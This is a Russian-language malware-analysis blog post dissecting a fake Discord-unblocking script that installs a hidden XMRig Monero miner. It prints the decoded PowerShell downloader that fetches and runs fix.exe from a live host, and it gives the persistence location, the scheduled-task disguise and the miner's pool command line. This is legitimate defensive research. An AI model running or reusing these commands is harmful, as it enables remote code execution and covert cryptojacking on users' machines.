---
layout: post
title: Discord Phantom Miner - Анализ вредоносного ПО, замаскированного под разблокировку Discord
lang: ru
categories: [Malware, Reverse-Engineering]
tags: [windows, malware, .NET, miner, reversing, confuserEx, confuser, obfuscation]
permalink: /posts/2024-10-11-discord-phantom-miner
---

![discord_malw.webp]({{ site.baseurl }}/images/discord_malware/discord_malw.webp)

## Введение

Недавно пользователь Telegram под ником [@belka_e](https://t.me/poxek_chat/118296) поделился скриншотом в чате [poxek](https://t.me/poxek_chat), который привлек внимание к подозрительному скрипту. Этот скрипт утверждал, что может обходить блокировки Discord в России. Однако при более тщательном изучении выяснилось, что программа скачивала и выполняла полезную нагрузку в памяти.

Скачивание происходило с адреса:

```
ayugram.temp.swtest.ru/install.ps1
```

![e8a560256efa7d9cf9a04af6ce5bf0f8.png]({{ site.baseurl }}/images/discord_malware/e8a560256efa7d9cf9a04af6ce5bf0f8.png)

Этот файл PowerShell содержал полезную нагрузку, закодированную в Base64. После декодирования был выявлен вредоносный код.

![752c84e53b7d8b8bd093f312b5668355.png]({{ site.baseurl }}/images/discord_malware/752c84e53b7d8b8bd093f312b5668355.png)

---

## Технический анализ

### Декодированная полезная нагрузка

```powershell
$username = $env:USERNAME
$url = "http://ayugram.temp.swtest.ru/fix"
$output = "C:\Users\$username\fix.exe"

Start-Sleep -Seconds 1
Invoke-WebRequest -Uri $url -OutFile $output
Start-Sleep -Seconds 5
Start-Process -FilePath $output
```

Этот скрипт скачивает и выполняет файл под названием `fix.exe` с удаленного сервера. После анализа было выяснено, что это бинарный файл `.NET`, обфусцированный с помощью ConfuserEx 1.0.0.

![ceda5ebbed4bfe3e98c6206e25d4d989.png]({{ site.baseurl }}/images/discord_malware/ceda5ebbed4bfe3e98c6206e25d4d989.png)

### Обфускация: ConfuserEx 1.0.0

Определив, что `fix.exe` является бинарным файлом .NET, я столкнулся с большими трудностями из-за обфускации, примененной **ConfuserEx 1.0.0**. Следуя инструкциям из [UnconfuserExTools Repository](https://github.com/landoncrabtree/UnconfuserExTools), мне удалось обратить обфускацию и начать анализировать поведение программы.

![76b25feae49567b98b2a08413c6ea854.png]({{ site.baseurl }}/images/discord_malware/76b25feae49567b98b2a08413c6ea854.png)

### Техники антиотладки

Первая часть бинарного файла проверяет, прикреплен ли отладчик или установлены ли переменные окружения, связанные с отладкой. В **dnSpy** вы можете отредактировать эти инструкции и заполнить их операциями `NOP`, чтобы обойти меры антиотладки.

![5689c290c0ede5d3fad23de5c8147818.png]({{ site.baseurl }}/images/discord_malware/5689c290c0ede5d3fad23de5c8147818.png)

### Механизм сохранения и закрепления

Вредоносное ПО сохраняет себя на диске в следующем месте:

```
C:\Users\<username>\AppData\Roaming\winupdater.exe
```

Затем оно создает запланированное задание с помощью `schtasks` с именем `MicrosoftEdgeUpdate`, что позволяет запускать вредоносное ПО с определенной регулярностью.

![1adc975fdee02118a4560166f7daa9f6.png]({{ site.baseurl }}/images/discord_malware/1adc975fdee02118a4560166f7daa9f6.png)

### Полезная нагрузка майнера XMRig

После закрепления вредоносная программа извлекает полезную нагрузку из своих ресурсов: криптомайнер **XMRig**.

![e8f6f37c3fb149686a848103aee0d78f.png]({{ site.baseurl }}/images/discord_malware/e8f6f37c3fb149686a848103aee0d78f.png)

#### Поведение программы:

- **Мониторинг процессов**: Прежде чем запустить процесс майнинга, вредоносная программа проверяет, запущены ли **Диспетчер задач** или **Process Hacker**. Если любой из этих инструментов обнаружен, программа завершает процесс майнинга, чтобы избежать обнаружения (на случай, если процесс майнинга уже был запущен).

![7243c8cd1b6bdd9ab049fea572434131.png]({{ site.baseurl }}/images/discord_malware/7243c8cd1b6bdd9ab049fea572434131.png)

- **Инъекция в ngentask.exe**: Программа запускает следующий процесс:
  ```
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe
  ```
  Затем она выделяет память в этом процессе и расшифровывает полезную нагрузку майнера **XMRig** в выделенное пространство. 
  
  ![40c794eec3b017f2c870a6336c7c465c.png]({{ site.baseurl }}/images/discord_malware/40c794eec3b017f2c870a6336c7c465c.png)

- **Запуск майнера**: Майнер запускается с следующими параметрами:
  ```
  --algo rx/0 --donate-level 0 --max-cpu-usage 25 -o mine.bmpool.org:6004 -u 7121405
  ```

Эта конфигурация позволяет программе майнить **Monero (XMR)** с использованием 25% мощности процессора, направляя полученную криптовалюту на кошелек злоумышленника.

![bad33f69ef42c6c9656150b9acf03819.png]({{ site.baseurl }}/images/discord_malware/bad33f69ef42c6c9656150b9acf03819.png)

---

## Заключение

Этот анализ показал, что вредоносное ПО не только закрепляется в системе через запланированные задания, но и использует несколько продвинутых методов для избежания обнаружения:

- **Антиотладочные** меры помогают предотвратить реверс-инжиниринг.
- Программа использует скрытые методы закрепления через задачу **MicrosoftEdgeUpdate**.
- Вредоносное ПО разворачивает криптомайнер **XMRig**, внедренный в процесс .NET, чтобы избежать обнаружения и работать в фоновом режиме.
